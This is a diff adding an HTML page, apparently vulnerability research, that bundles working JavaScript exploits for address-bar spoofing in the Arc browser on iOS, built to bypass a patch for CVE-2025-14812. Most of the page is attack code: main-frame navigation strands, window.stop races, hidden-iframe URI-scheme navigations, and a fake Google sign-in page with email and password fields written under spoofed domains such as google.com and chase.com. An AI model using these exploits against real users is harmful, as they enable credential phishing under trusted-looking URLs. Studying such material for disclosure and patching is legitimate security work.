@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>CVE-2025-14812 Bypass Suite</title>
+<style>
+:root { --bg: #0a0e17; --card: #111827; --border: #1e293b; --accent: #3b82f6; --green: #22c55e; --orange: #f59e0b; --red: #ef4444; --purple: #a855f7; --text: #e2e8f0; --muted: #64748b; }
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body { font: 14px/1.5 -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); padding: 0 0 env(safe-area-inset-bottom, 20px); }
+.hdr { background: linear-gradient(135deg, #1e1b4b, #0f172a); padding: 20px 16px; border-bottom: 1px solid var(--border); }
+.hdr h1 { font-size: 17px; color: #fff; } .hdr .sub { font-size: 11px; color: var(--muted); margin-top: 4px; }
+.tag { display: inline-block; font-size: 10px; font-weight: 700; padding: 2px 7px; border-radius: 4px; margin-right: 4px; }
+.tag-crit { background: #7f1d1d; color: #fca5a5; } .tag-new { background: #14532d; color: #86efac; }
+.tests { padding: 12px; }
+.card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; margin-bottom: 10px; padding: 14px; }
+.card-title { font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 6px; }
+.card-desc { font-size: 11px; color: var(--muted); margin: 6px 0 4px; line-height: 1.5; }
+.card-tech { font-size: 10px; font-family: ui-monospace, Menlo, monospace; color: var(--green); background: #0f1a0f; padding: 3px 8px; border-radius: 4px; display: inline-block; margin: 4px 0 8px; word-break: break-all; }
+.btn { display: block; width: 100%; padding: 11px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; color: #fff; cursor: pointer; margin-top: 6px; }
+.btn:active { opacity: .7; transform: scale(.98); }
+.btn-blue { background: var(--accent); } .btn-green { background: var(--green); }
+.btn-orange { background: var(--orange); color: #000; } .btn-red { background: var(--red); }
+.btn-purple { background: var(--purple); }
+.section-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); padding: 14px 4px 6px; }
+#log { background: #050a12; margin: 12px; padding: 10px; border-radius: 8px; font: 11px/1.6 ui-monospace, Menlo, monospace; max-height: 220px; overflow-y: auto; display: none; -webkit-overflow-scrolling: touch; word-break: break-all; }
+.l-ok { color: var(--green); } .l-err { color: var(--red); } .l-info { color: var(--orange); }
+.toggle-log { display: block; margin: 0 12px 12px; width: calc(100% - 24px); padding: 10px; background: var(--card); border: 1px solid var(--border); border-radius: 8px; color: var(--muted); font-size: 12px; cursor: pointer; text-align: center; }
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <h1>CVE-2025-14812 Bypass Suite</h1>
+  <div class="sub">
+    <span class="tag tag-new">MAIN-FRAME</span>
+    <span class="tag tag-crit">BYPASSES SUBFRAME FIX</span>
+    Arc iOS address bar spoofing — tests that evade the v1.45.2 patch
+  </div>
+</div>
+
+<div class="tests">
+
+<!-- ============================================================ -->
+<div class="section-label">★ Class A — Main-Frame Pending-URL Strands</div>
+<!-- ============================================================ -->
+
+<!-- P1: 204 No Content -->
+<div class="card">
+  <div class="card-title">🟢 P1 — 204 No Content Strand</div>
+  <div class="card-desc">Navigate main frame to <b>google.com/generate_204</b>. HTTP 204 never commits a document → attacker page stays painted, bar shows google.com. Zero-click.</div>
+  <div class="card-tech">location.assign(google.com/generate_204) → didCommitNavigation never fires</div>
+  <button class="btn btn-green" onclick="P1()">Launch P1 — zero-click 204</button>
+  <button class="btn btn-blue" onclick="P1_manual()" style="margin-top:4px;font-size:12px;">P1b — diagnostic only (don't inject)</button>
+</div>
+
+<!-- P2: Filtered Port Hang -->
+<div class="card">
+  <div class="card-title">🟠 P2 — Filtered Port Hang</div>
+  <div class="card-desc">Navigate to <b>apple.com:8443</b> (firewall-dropped port). TCP SYN gets no reply → bar shows apple.com for ~30-75 seconds while attacker page stays. Spoofs <b>ANY</b> domain.</div>
+  <div class="card-tech">location.assign(apple.com:8443) → SYN timeout ~30-75s, no commit</div>
+  <button class="btn btn-orange" onclick="P2()">Launch P2 — filtered port</button>
+</div>
+
+<!-- P3: Download Freeze -->
+<div class="card">
+  <div class="card-title">🔵 P3 — Download Navigation Freeze</div>
+  <div class="card-desc">Navigate to a download URL (Content-Disposition: attachment). WKWebView converts to download, never commits. Bar stays on download host.</div>
+  <div class="card-tech">location.assign(github release .zip) → attachment policy-change, no commit</div>
+  <button class="btn btn-blue" onclick="P3()">Launch P3 — download freeze</button>
+</div>
+
+<!-- P4: window.stop() Race -->
+<div class="card">
+  <div class="card-title">🔴 P4 — window.stop() Race</div>
+  <div class="card-desc">Navigate to <b>chase.com</b>, then <code>window.stop()</code> before commit. Bar updates to chase.com provisionally, stop cancels the load, attacker doc stays. Spoofs <b>ANY</b> domain.</div>
+  <div class="card-tech">location.assign(chase.com) → setTimeout(window.stop, 60) → no commit</div>
+  <button class="btn btn-red" onclick="P4()">Launch P4 — window.stop race</button>
+</div>
+
+<!-- P5: window.open + 204 strand -->
+<div class="card">
+  <div class="card-title">🟣 P5 — window.open + 204 Strand</div>
+  <div class="card-desc">Open new tab to <b>google.com/generate_204</b>. 204 never commits → tab stays on writable about:blank. Write attacker doc via <code>document.write()</code>. Bar reads google.com over attacker content.</div>
+  <div class="card-tech">window.open(generate_204) → 204 no commit → opener document.write()</div>
+  <button class="btn btn-purple" onclick="P5()">Launch P5 — new tab + inject (1 tap)</button>
+  <button class="btn btn-blue" onclick="P5_diag()" style="margin-top:4px;font-size:12px;">P5b — diagnostic (open only, no write)</button>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-label">Class B — Alternative Trigger Paths</div>
+<!-- ============================================================ -->
+
+<!-- B1: object/embed instead of iframe -->
+<div class="card">
+  <div class="card-title">🧪 B1 — object/embed URI Scheme</div>
+  <div class="card-desc">Uses <code>&lt;object&gt;</code> and <code>&lt;embed&gt;</code> instead of <code>&lt;iframe&gt;</code> to trigger URI-scheme top navigation. WKWebView may not classify these as "subframes" in the same way.</div>
+  <div class="card-tech">&lt;object type=text/html&gt; + top.location = geo:0,0</div>
+  <button class="btn btn-blue" onclick="B1()">Launch B1 — object/embed test</button>
+</div>
+
+<!-- B2: form submission targeting _top -->
+<div class="card">
+  <div class="card-title">🧪 B2 — Form Submit to URI Scheme</div>
+  <div class="card-desc">Hidden iframe auto-submits a form with <code>target="_top"</code> and <code>action="geo:0,0"</code>. Form-driven navigation may be treated differently than script-driven <code>top.location</code>.</div>
+  <div class="card-tech">&lt;form action="geo:0,0" target="_top"&gt;.submit()</div>
+  <button class="btn btn-blue" onclick="B2()">Launch B2 — form geo: test</button>
+</div>
+
+<!-- B3: anchor click to URI scheme -->
+<div class="card">
+  <div class="card-title">🧪 B3 — Anchor Click URI Scheme</div>
+  <div class="card-desc">Hidden iframe auto-clicks an <code>&lt;a href="geo:0,0" target="_top"&gt;</code>. Anchor-click navigation has different <code>navigationType</code> (.linkActivated) than script assignment.</div>
+  <div class="card-tech">&lt;a href="geo:0,0" target="_top"&gt;.click()</div>
+  <button class="btn btn-blue" onclick="B3()">Launch B3 — anchor click test</button>
+</div>
+
+<!-- B4: meta refresh to URI scheme -->
+<div class="card">
+  <div class="card-title">🧪 B4 — Nested Frame + Different Schemes</div>
+  <div class="card-desc">Grandchild iframe (nested 2 deep) navigates top. Tests whether Arc's "subframe" check only checks immediate children, not grandchildren.</div>
+  <div class="card-tech">iframe → iframe → top.location = geo:0,0 (grandchild nav)</div>
+  <button class="btn btn-blue" onclick="B4()">Launch B4 — nested grandchild</button>
+</div>
+
+<!-- B5: about:blank same-origin iframe -->
+<div class="card">
+  <div class="card-title">🧪 B5 — Same-Origin about:blank Frame</div>
+  <div class="card-desc">Creates an about:blank iframe (inherits parent origin). Writes script that navigates top to URI scheme. sourceFrame origin = parent origin → may confuse "is this a subframe?" check.</div>
+  <div class="card-tech">iframe(about:blank, same-origin) → top.location = geo:0,0</div>
+  <button class="btn btn-blue" onclick="B5()">Launch B5 — same-origin frame</button>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-label">Class C — Exotic Schemes & Combos</div>
+<!-- ============================================================ -->
+
+<!-- C1: uncommon URI schemes -->
+<div class="card">
+  <div class="card-title">🧪 C1 — Uncommon URI Scheme Probe</div>
+  <div class="card-desc">Tests URI schemes beyond geo:/tel:/sms: that may not be in Arc's denylist: <code>maps:</code>, <code>comgooglemaps:</code>, <code>webcal:</code>, <code>x-apple-data-detectors:</code>, <code>shortcuts:</code>, <code>calshow:</code>, <code>facetime:</code>.</div>
+  <div class="card-tech">iframe sandbox=allow-top-navigation + top.location = {scheme}</div>
+  <button class="btn btn-blue" onclick="C1()">Launch C1 — scheme sweep</button>
+</div>
+
+<!-- C2: 302 redirect to URI scheme -->
+<div class="card">
+  <div class="card-title">🧪 C2 — HTTP 302 → URI Scheme</div>
+  <div class="card-desc">Iframe navigates top to <code>https://attacker.com/redir</code> which 302-redirects to <code>geo:0,0</code>. Initial navigation is web-scheme (passes check?), redirect lands on URI scheme.</div>
+  <div class="card-tech">top.location = https://redir → 302 Location: geo:0,0</div>
+  <div class="card-desc" style="color:var(--orange);">⚠️ Needs attacker server. Set up: <code>res.redirect(302, 'geo:0,0')</code></div>
+  <button class="btn btn-orange" onclick="C2()">Launch C2 — redirect test (needs server)</button>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-label">Class D — Regression Check</div>
+<!-- ============================================================ -->
+
+<div class="card">
+  <div class="card-title">🔄 R1 — Original CVE-2025-14812 Regression</div>
+  <div class="card-desc">Tests the <b>exact original payload</b> from #3638087/#3925437: <code>sandbox="allow-scripts allow-top-navigation"</code> + <code>top.location = geo:0,0</code>. If this still works, the fix has regressed again.</div>
+  <div class="card-tech">iframe sandbox=allow-scripts+allow-top-navigation → top.location=geo:0,0</div>
+  <button class="btn btn-red" onclick="R1()">Launch R1 — regression test</button>
+</div>
+
+<!-- ============================================================ -->
+<div class="section-label">Class E — Escalation Checks</div>
+<!-- ============================================================ -->
+
+<div class="card">
+  <div class="card-title">📋 E1 — Share / Copy URL Verification</div>
+  <div class="card-desc">After a successful spoof: use iOS Share Sheet or "Copy Link" in Arc. Check if the <b>shared/copied URL</b> is the spoofed domain or the real one. If spoofed → escalation.</div>
+  <div class="card-desc" style="color:var(--green);">✅ Run this AFTER a successful P1-P5 test. Tap Share icon in Arc.</div>
+</div>
+
+</div>
+
+<div id="log"></div>
+<button class="toggle-log" onclick="toggleLog()">Show/Hide Debug Log</button>
+
+<script>
+// =============================================
+// Logging
+// =============================================
+var L = document.getElementById('log');
+function log(m, cls) {
+  L.style.display = 'block';
+  var d = document.createElement('div');
+  d.className = cls || 'l-info';
+  d.textContent = new Date().toLocaleTimeString() + ' ' + m;
+  L.appendChild(d);
+  L.scrollTop = L.scrollHeight;
+}
+function toggleLog() { L.style.display = L.style.display === 'none' ? 'block' : 'none'; }
+
+var HERE = location.origin + location.pathname.replace(/[^/]*$/, '');
+
+// =============================================
+// Attacker page template (shown after spoof)
+// =============================================
+function attackerPage(spoofedDomain) {
+  return '<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">' +
+    '<title>Sign in - ' + spoofedDomain + '</title>' +
+    '<body style="font:16px -apple-system,system-ui,sans-serif;margin:0;background:#fff;color:#202124">' +
+    '<div style="background:#16a34a;color:#fff;padding:8px 12px;font:bold 13px system-ui">' +
+    'pwned by 33x — bar reads ' + spoofedDomain + ' but this page is from ' + location.hostname + '</div>' +
+    '<div style="max-width:400px;margin:56px auto;text-align:center;font-family:system-ui">' +
+    '<div style="font-size:28px;color:#4285f4;font-weight:700">Google</div>' +
+    '<h2 style="font-weight:400;margin:16px 0 4px;font-size:22px">Sign in</h2>' +
+    '<p style="color:#5f6368;margin:0 0 24px;font-size:14px">to continue to Gmail</p>' +
+    '<input placeholder="Email or phone" style="width:100%;box-sizing:border-box;padding:13px;border:1px solid #dadce0;border-radius:6px;font-size:15px;-webkit-appearance:none">' +
+    '<input type=password placeholder="Password" style="width:100%;box-sizing:border-box;padding:13px;margin-top:14px;border:1px solid #dadce0;border-radius:6px;font-size:15px;-webkit-appearance:none">' +
+    '<button style="margin-top:22px;float:right;background:#1a73e8;color:#fff;border:0;padding:11px 24px;border-radius:6px;font-size:15px;font-weight:600">Next</button>' +
+    '</div></body>';
+}
+
+// =============================================
+// P1 — 204 No Content (zero-click)
+// =============================================
+function P1() {
+  log('P1: Navigating main frame to google.com/generate_204...', 'l-ok');
+  log('P1: If bar shows google.com + you see "pwned by 33x" = SPOOFED', 'l-info');
+
+  // Save attacker content BEFORE navigating away
+  var content = attackerPage('google.com');
+
+  // Navigate — 204 should never commit
+  location.assign('https://www.google.com/generate_204');
+
+  // After 204 response (no commit), try to write attacker page
+  // This works because 204 doesn't tear down the current document
+  setTimeout(function() {
+    try {
+      document.open();
+      document.write(content);
+      document.close();
+      // Can't log after document.write replaces the page
+    } catch(e) {
+      // If we can still run, the 204 may have been handled differently
+    }
+  }, 500);
+}
+
+function P1_manual() {
+  log('P1b: Navigating to generate_204 (diagnostic)...', 'l-info');
+  log('P1b: Watch the bar. If it shows google.com with blank content, strand exists.', 'l-info');
+  location.assign('https://www.google.com/generate_204');
+}
+
+// =============================================
+// P2 — Filtered Port Hang
+// =============================================
+function P2() {
+  log('P2: Navigating to apple.com:8443 (filtered port)...', 'l-ok');
+  log('P2: TCP SYN will hang ~30-75s. Bar should show apple.com.', 'l-info');
+  log('P2: window.stop() at 200ms to kill spinner.', 'l-info');
+
+  var content = attackerPage('apple.com');
+  location.assign('https://www.apple.com:8443/');
+
+  // Stop the spinner after bar updates but before any possible commit
+  setTimeout(function() {
+    try { window.stop(); } catch(e) {}
+    setTimeout(function() {
+      try {
+        document.open();
+        document.write(content);
+        document.close();
+      } catch(e) {}
+    }, 100);
+  }, 200);
+}
+
+// =============================================
+// P3 — Download Navigation Freeze
+// =============================================
+function P3() {
+  log('P3: Navigating to github.com download URL...', 'l-ok');
+  log('P3: Content-Disposition:attachment → no document commit.', 'l-info');
+
+  var content = attackerPage('github.com');
+  // GitHub release download — Content-Disposition: attachment
+  location.assign('https://github.com/nicehash/NiceHashQuickMiner/releases/download/v0.5.4.6/NiceHashQuickMinerV0546.zip');
+
+  setTimeout(function() {
+    try {
+      document.open();
+      document.write(content);
+      document.close();
+    } catch(e) {}
+  }, 600);
+}
+
+// =============================================
+// P4 — window.stop() Race
+// =============================================
+function P4() {
+  log('P4: Navigating to chase.com + window.stop() race...', 'l-red');
+  log('P4: Timing: stop at 80ms (after provisional, before commit).', 'l-info');
+
+  var content = attackerPage('chase.com');
+  location.assign('https://www.chase.com/');
+
+  setTimeout(function() {
+    try { window.stop(); } catch(e) {}
+    setTimeout(function() {
+      try {
+        document.open();
+        document.write(content);
+        document.close();
+      } catch(e) {}
+    }, 50);
+  }, 80);
+}
+
+// =============================================
+// P5 — window.open + 204 strand
+// =============================================
+function P5() {
+  log('P5: Opening new tab to google.com/generate_204...', 'l-ok');
+  var w = window.open('https://www.google.com/generate_204', '_blank');
+  if (!w) { log('P5: Popup blocked — tap the button directly', 'l-err'); return; }
+  log('P5: New tab opened. Bar should show google.com. Writing attacker doc in 800ms...', 'l-info');
+
+  setTimeout(function() {
+    try { w.stop(); } catch(e) {}
+    try {
+      w.document.open();
+      w.document.write(attackerPage('google.com'));
+      w.document.close();
+      log('P5: Wrote attacker doc. Check NEW TAB bar → should read google.com.', 'l-ok');
+    } catch(e) {
+      log('P5: document.write threw: ' + e.message + ' (target committed — strand failed)', 'l-err');
+    }
+  }, 800);
+}
+
+function P5_diag() {
+  log('P5b: Opening generate_204 (diagnostic — no write)...', 'l-info');
+  var w = window.open('https://www.google.com/generate_204', '_blank');
+  if (!w) { log('P5b: Popup blocked', 'l-err'); return; }
+  log('P5b: Opened. Check new tab bar: google.com = strand exists; blank/about:blank = no strand.', 'l-info');
+}
+
+// =============================================
+// B1 — object/embed URI scheme
+// =============================================
+function B1() {
+  log('B1: Injecting <object> + <embed> with geo: navigation...', 'l-info');
+
+  // object element
+  var obj = document.createElement('object');
+  obj.type = 'text/html';
+  obj.width = '1'; obj.height = '1';
+  obj.style.cssText = 'position:absolute;left:-9999px;';
+  obj.data = 'data:text/html,' + encodeURIComponent('<script>setTimeout(function(){try{top.location.href="geo:0,0"}catch(e){}},300)<\/script>');
+  document.body.appendChild(obj);
+  log('B1: <object> injected with geo: nav script.', 'l-info');
+
+  // embed element
+  setTimeout(function() {
+    var emb = document.createElement('embed');
+    emb.type = 'text/html';
+    emb.width = '1'; emb.height = '1';
+    emb.style.cssText = 'position:absolute;left:-9999px;';
+    emb.src = 'data:text/html,' + encodeURIComponent('<script>setTimeout(function(){try{top.location.href="tel:+1234567890"}catch(e){}},300)<\/script>');
+    document.body.appendChild(emb);
+    log('B1: <embed> injected with tel: nav script.', 'l-info');
+  }, 1500);
+
+  log('B1: Watch the address bar over the next 3 seconds.', 'l-info');
+}
+
+// =============================================
+// B2 — Form submit to URI scheme
+// =============================================
+function B2() {
+  log('B2: Creating iframe with form → geo: submission...', 'l-info');
+
+  var iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts allow-top-navigation allow-forms';
+  iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+  iframe.srcdoc = '<form id="f" action="geo:0,0" target="_top"><input type="hidden" name="q" value="0,0"></form>' +
+    '<script>setTimeout(function(){document.getElementById("f").submit()},300)<\/script>';
+  document.body.appendChild(iframe);
+  log('B2: Iframe with form auto-submit to geo:0,0 target=_top injected.', 'l-info');
+}
+
+// =============================================
+// B3 — Anchor click URI scheme
+// =============================================
+function B3() {
+  log('B3: Creating iframe with anchor click → geo:...', 'l-info');
+
+  var iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts allow-top-navigation';
+  iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+  iframe.srcdoc = '<a id="a" href="geo:0,0" target="_top">x</a>' +
+    '<script>setTimeout(function(){document.getElementById("a").click()},300)<\/script>';
+  document.body.appendChild(iframe);
+  log('B3: Iframe with anchor auto-click to geo:0,0 target=_top injected.', 'l-info');
+}
+
+// =============================================
+// B4 — Nested grandchild frame
+// =============================================
+function B4() {
+  log('B4: Creating nested iframe (grandchild) → geo:...', 'l-info');
+
+  var outer = document.createElement('iframe');
+  outer.sandbox = 'allow-scripts allow-top-navigation';
+  outer.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+
+  // Outer iframe creates an inner iframe which navigates top
+  var innerPayload = encodeURIComponent(
+    '<script>setTimeout(function(){try{top.location.href="geo:0,0"}catch(e){}},300)<\/script>'
+  );
+  outer.srcdoc = '<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="' +
+    innerPayload.replace(/"/g, '&quot;') +
+    '"></iframe>';
+
+  document.body.appendChild(outer);
+  log('B4: Nested grandchild iframe injected. Grandchild navigates top to geo:.', 'l-info');
+}
+
+// =============================================
+// B5 — Same-origin about:blank frame
+// =============================================
+function B5() {
+  log('B5: Creating about:blank iframe (same-origin)...', 'l-info');
+
+  var iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+  // No sandbox — about:blank inherits parent origin
+  document.body.appendChild(iframe);
+
+  setTimeout(function() {
+    try {
+      iframe.contentDocument.open();
+      iframe.contentDocument.write('<script>setTimeout(function(){top.location.href="geo:0,0"},200)<\/script>');
+      iframe.contentDocument.close();
+      log('B5: Wrote geo: nav script into same-origin about:blank frame.', 'l-ok');
+    } catch(e) {
+      log('B5: Write failed: ' + e.message, 'l-err');
+    }
+  }, 100);
+}
+
+// =============================================
+// C1 — Uncommon URI schemes
+// =============================================
+function C1() {
+  log('C1: Testing uncommon URI schemes from sandboxed iframe...', 'l-info');
+
+  var schemes = [
+    'maps:0,0',
+    'comgooglemaps://?center=0,0',
+    'webcal://example.com/cal.ics',
+    'calshow:0',
+    'facetime:test@test.com',
+    'facetime-audio:test@test.com',
+    'shortcuts://run-shortcut?name=test',
+    'x-apple-data-detectors://1',
+    'itms-apps://apps.apple.com',
+    'music://music.apple.com',
+    'sms:+1234567890',
+    'mailto:test@test.com'
+  ];
+
+  var delay = 0;
+  schemes.forEach(function(scheme) {
+    delay += 1200;
+    setTimeout(function() {
+      log('C1: Testing ' + scheme.split(':')[0] + ': ...', 'l-info');
+      var iframe = document.createElement('iframe');
+      iframe.sandbox = 'allow-scripts allow-top-navigation';
+      iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+      iframe.srcdoc = '<script>setTimeout(function(){try{top.location.href="' +
+        scheme.replace(/"/g, '\\"') + '"}catch(e){}},200)<\/script>';
+      document.body.appendChild(iframe);
+
+      // Clean up after each test
+      setTimeout(function() { iframe.remove(); }, 1000);
+    }, delay);
+  });
+
+  log('C1: Running ' + schemes.length + ' scheme tests over ' + Math.round(delay/1000) + 's. Watch the bar.', 'l-info');
+}
+
+// =============================================
+// C2 — Server redirect to URI scheme
+// =============================================
+function C2() {
+  log('C2: This test needs an attacker-controlled server.', 'l-err');
+  log('C2: Set up a server that 302-redirects to geo:0,0', 'l-info');
+  log('C2: Example: app.get("/redir", (req,res) => res.redirect(302, "geo:0,0"))', 'l-info');
+
+  var serverUrl = prompt('Enter your redirect server URL (e.g., https://your-server.com/redir):', '');
+  if (!serverUrl) { log('C2: Cancelled.', 'l-err'); return; }
+
+  var iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts allow-top-navigation';
+  iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+  iframe.srcdoc = '<script>setTimeout(function(){top.location.href="' +
+    serverUrl.replace(/"/g, '\\"') + '"},300)<\/script>';
+  document.body.appendChild(iframe);
+  log('C2: Iframe navigating top to ' + serverUrl + ' (should 302 → geo:)', 'l-ok');
+}
+
+// =============================================
+// R1 — Regression check (original CVE payload)
+// =============================================
+function R1() {
+  log('R1: Testing ORIGINAL CVE-2025-14812 payload...', 'l-info');
+  log('R1: sandbox + allow-top-navigation + top.location = geo:0,0', 'l-info');
+
+  var iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts allow-top-navigation allow-top-navigation-by-user-activation';
+  iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+  // Use cross-origin payload
+  iframe.src = 'https://ajaone.github.io/testing-repository/test/payload-sandbox-top.html';
+  document.body.appendChild(iframe);
+
+  log('R1: Cross-origin iframe loaded from ajaone.github.io.', 'l-info');
+  log('R1: If bar changes to ajaone.github.io = REGRESSION (fix broken!)', 'l-err');
+  log('R1: If bar stays on current domain = fix holds.', 'l-ok');
+}
+
+// =============================================
+// Init
+// =============================================
+log('CVE-2025-14812 Bypass Suite loaded.', 'l-ok');
+log('Origin: ' + location.origin, 'l-info');
+log('UA: ' + navigator.userAgent, 'l-info');
+log('Tests P1-P5 bypass the subframe fix via MAIN-FRAME navigations.', 'l-ok');
+</script>
+
+</body>
+</html>
